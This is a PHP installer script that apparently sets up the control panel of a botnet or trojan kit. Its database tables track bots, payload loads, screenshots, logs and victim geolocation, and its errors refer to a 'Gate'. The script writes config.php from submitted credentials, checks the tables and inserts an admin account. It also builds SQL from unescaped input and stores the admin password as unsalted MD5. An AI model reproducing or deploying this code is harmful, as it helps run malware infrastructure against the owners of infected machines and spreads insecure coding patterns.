<?
	set_time_limit(0);
	define('INSTALLER', 1);
	include_once "../common.php";	
	error_reporting( E_ERROR );
	
	$smarty->assign('DIR', '../');
	$smarty->display('header.tpl');
?>
<div align='left' width='100%'><fieldset style="background: #FCFCFC none repeat scroll 0% 0%; width: 720px; -moz-background-clip: border; -moz-background-origin: padding; -moz-background-inline-policy: continuous;"><legend align="center"><b>LOGS</b>:</legend>
<ul><hr size='1' color='#CCC'><br>
<?	
	if( file_exists(ROOT_PATH."/config.php") ) die("<center><font class='error'>Delete <b>config.php</b> before instalation!</font>");

	if( !isset($_POST['DB_SERVER']) || !isset($_POST['DB_NAME']) || !isset($_POST['DB_USER']) || !isset($_POST['DB_PASSWORD']) 
			|| !isset($_POST['ADMIN_PASSWORD'])  )
	die('<font class="error">Data send error</font>');

	$DB_SERVER = $_POST['DB_SERVER'];
	$DB_NAME = $_POST['DB_NAME'];
	$DB_USER = $_POST['DB_USER'];
	$DB_PASSWORD = $_POST['DB_PASSWORD'];
	$ADMIN_PASSWORD = $_POST['ADMIN_PASSWORD'];

	if( $DB_SERVER==='' || $DB_NAME==='' || $DB_USER==='' || $DB_PASSWORD==='' || $ADMIN_PASSWORD==='' )
	die('<font class="error">Please fill the all fields</font>');

	echo "<b>" . gmdate('Y.m.d H:i:s') . "</b> : start install<br><br>";
	flush();
	
	// checking php
	if (!function_exists('mysql_connect'))
		die("<font class='error'>ERROR</font> : mysql_connect() is not exists!");
	if (!function_exists('mysqli_connect'))
		die("<font class='error'>ERROR</font> : mysqli_connect() is not exists!");
	if (!function_exists('file_get_contents'))
		die("<font class='error'>ERROR</font> : file_get_contents () is not exists!");
	if (!function_exists('file_put_contents'))
		die("<font class='error'>ERROR</font> : file_put_contents() is not exists!");
	flush();

	// dumping config.php
	echo '<br><li> Dumping <b>config.php</b> : <br>';
	flush();
	$smarty->assign(array( 'DB_HOST'=>$DB_SERVER,'DB_USER'=>$DB_USER,'DB_PASS'=>$DB_PASSWORD,'DB_DATABASE'=>$DB_NAME, 'ROOT_PATH'=>$root_path ));
	
	$config = $smarty->fetch('config.tpl');
	$file = ROOT_PATH . "/config.php";
	if (!@file_put_contents($file, $config) || !file_exists($file))
		die("<font class='error'>ERROR</font> : file_put_contents() fails on \"$file\"");
	echo " &nbsp; &nbsp; \"$file\" was dumped <b>successfully [ + ]</b><br>";
	flush();
	
	include_once ROOT_PATH."/config.php";	
	
	// install stuff
	$db = @mysql_connect($DB_SERVER, $DB_USER, $DB_PASSWORD);
	if (!$db)
		die("<font class='error'>ERROR</font> : Gate : mysql_connect fails : " . mysql_error());

	// getting path to mysql
	$res = @mysql_query("SELECT @@basedir");
	if (!$res) die("<font class='error'>ERROR</font> : Gate : cannot execute \" $sql \" : " . mysql_error());

	echo '<br><li> Checking tables on server  : <br>';
	flush();	
	$tables = array('bots_t','city_t','configs_t','country_t','files_t','geo_city','geo_country','geo_loc',
					'ip_t','loads_rep_t','loads_t','logs_t','os_t','plugins','screens_t','users_t');

	$dbase_is = mysqli_connect ($DB_SERVER, $DB_USER, $DB_PASSWORD, 'INFORMATION_SCHEMA');	
	if (mysqli_connect_errno())
		die("<font class='error'>ERROR</font> : Gate: Connect failed : " . mysqli_connect_error());

	include_once ROOT_PATH."/mod/db.php";
	$db = new DB();
	
	flush();
	echo "<font class='ok'>Existing tables : </font> ";
	for ($i = 0; $i < count($tables); $i++) 
	{
		$table = $tables[$i];
		$sql = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '$DB_NAME' AND TABLE_NAME = '$table' LIMIT 1";
		$res = @$db->query($sql)
			or die("<font class='error'>ERROR</font> : bad sql : \" $sql \" : " . $db->error);
		if ($db->affected_rows == 0)
			die("<font class='error'>ERROR</font> : table <i>$table</i> is not exists : \" $sql \"");
		echo "$table, ";
	}
	echo "<br><b>Successfull [ + ]</b><br>";		
	flush();
	
	# create admin account
	echo '<br><li> Creating admin account...';
	flush();
	$query = "INSERT INTO users_t VALUES(1, 'admin', '".md5($ADMIN_PASSWORD)."', CONVERT_TZ(now(),@@time_zone,'+0:00'), '')";
	$res = @$db->query($query);
	if (!$res) die("<font class='error'>ERROR</font> : cannot execute \" $query \" : " . $db->error);
	echo " <b>[ + ]</b><br>";
	flush();
?>
<br>
<br><center>
<font class='ok' id='go'>Instalation comlete!</font><br>
<font class='error' id='go'>You need to delete Installer folder!</font>
<br><br>
<a href='../' target='_parent'>Go to Main Page</a></center>
</ul></fieldset></div>
<script src='../scripts/jquery.js'></script>
<script>
setTimeout(function() { parent.document.location.href='../'; }, 5000);
</script>
